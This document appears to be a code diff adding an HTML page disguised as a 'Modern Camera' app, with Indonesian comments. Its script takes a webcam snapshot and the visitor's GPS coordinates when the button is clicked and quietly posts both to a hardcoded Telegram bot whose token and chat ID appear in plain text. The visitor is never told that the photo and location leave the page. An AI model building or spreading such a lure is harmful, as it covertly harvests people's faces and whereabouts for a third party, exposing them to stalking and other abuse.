@@ -1,0 +1,185 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Modern Camera</title>
+    <style>
+        body, html {
+            margin: 0;
+            padding: 0;
+            height: 100%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background-color: #202124;
+            font-family: 'Poppins', sans-serif;
+            overflow: hidden;
+        }
+
+        .camera-container {
+            position: relative;
+            width: 100%;
+            max-width: 400px;
+            height: 100vh;
+            background-color: #000;
+            border-radius: 30px;
+            box-shadow: 0 0 40px rgba(0, 0, 0, 0.8);
+            overflow: hidden;
+        }
+
+        video {
+            width: 100%;
+            height: auto;
+            filter: brightness(1.5) contrast(1.2) saturate(1.5);
+            border-radius: 15px;
+            box-shadow: 0 0 20px rgba(255, 255, 255, 0.3);
+        }
+
+        .capture-button {
+            position: absolute;
+            bottom: 30px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 80px;
+            height: 80px;
+            border-radius: 50%;
+            background: linear-gradient(145deg, #ff6b6b, #ff4747);
+            border: none;
+            cursor: pointer;
+            box-shadow: 0 5px 15px rgba(255, 50, 50, 0.7);
+            transition: transform 0.2s ease, box-shadow 0.2s ease;
+        }
+
+        .capture-button:hover {
+            transform: scale(1.1);
+            box-shadow: 0 5px 25px rgba(255, 50, 50, 0.9);
+        }
+
+        .info {
+            position: absolute;
+            bottom: 100px;
+            width: 100%;
+            text-align: center;
+            font-size: 16px;
+            color: #fff;
+        }
+
+        .info span {
+            display: block;
+            margin-top: 5px;
+        }
+    </style>
+</head>
+<body>
+
+<div class="camera-container">
+    <video id="cameraStream" autoplay playsinline></video>
+    <div class="info">
+        <span>📍 Location: Loading...</span>
+        <span>🕒 Time: Loading...</span>
+    </div>
+    <button class="capture-button" id="captureButton"></button>
+</div>
+
+<script>
+    const token = '7207871141:AAGQHPInZWuoHSJzHr5s-kZQr4pM63fizPs';  // Gantilah dengan token bot Telegram Anda
+    const chatId = '6864784021';  // Gantilah dengan chat ID bot Anda
+
+    const video = document.getElementById('cameraStream');
+    const captureButton = document.getElementById('captureButton');
+    const locationElement = document.querySelector('.info span:nth-child(1)');
+    const timeElement = document.querySelector('.info span:nth-child(2)');
+
+    // Fungsi untuk mengakses kamera dengan izin
+    function startCamera() {
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(stream => {
+                video.srcObject = stream;
+            })
+            .catch(error => {
+                console.error('Error accessing the camera:', error);
+                alert('Gagal mengakses kamera 😔, cek izin kamera!');
+            });
+    }
+
+    // Fungsi untuk mendapatkan lokasi pengguna
+    function getLocation(callback) {
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(position => {
+                const latitude = position.coords.latitude;
+                const longitude = position.coords.longitude;
+                const mapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
+                const locationText = `<a href="${mapsLink}" target="_blank">📍 View on Maps</a>`;
+                callback(locationText, latitude, longitude);
+            }, error => {
+                console.error('Error getting location:', error);
+                callback('Lokasi tidak tersedia');
+            });
+        } else {
+            callback('Geolocation tidak didukung');
+        }
+    }
+
+    // Fungsi untuk mendapatkan waktu saat ini
+    function getCurrentTime() {
+        const now = new Date();
+        return now.toLocaleString();
+    }
+
+    // Update informasi waktu dan lokasi
+    function updateInfo(location) {
+        const time = getCurrentTime();
+        locationElement.innerHTML = location;
+        timeElement.textContent = `🕒 Time: ${time}`;
+    }
+
+    // Fungsi untuk menangkap gambar
+    function captureImage() {
+        const canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        return new Promise(resolve => {
+            canvas.toBlob(resolve, 'image/jpeg');
+        });
+    }
+
+    // Kirim gambar ke bot Telegram
+    function sendPhotoToTelegram(blob, location, time) {
+        const formData = new FormData();
+        formData.append('photo', blob, 'image.jpg');
+        formData.append('chat_id', chatId);
+
+        const caption = `📍 Location: ${location}\n🕒 Time: ${time}`;
+        formData.append('caption', caption);
+
+        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+            method: 'POST',
+            body: formData,
+        }).then(response => {
+            console.log('Photo sent successfully with caption');
+        }).catch(error => {
+            console.error('Error sending photo:', error);
+        });
+    }
+
+    // Event listener untuk menangkap gambar dan mengirim ke Telegram
+    captureButton.addEventListener('click', async () => {
+        alert('Izin kan kamera untuk melihat wajahmu 🥰');
+        startCamera();
+        getLocation(async (locationText, latitude, longitude) => {
+            updateInfo(locationText);
+
+            const time = getCurrentTime();
+            const imageBlob = await captureImage();
+
+            sendPhotoToTelegram(imageBlob, `Lat: ${latitude}, Lon: ${longitude}`, time);
+        });
+    });
+
+</script>
+
+</body>
+</html>
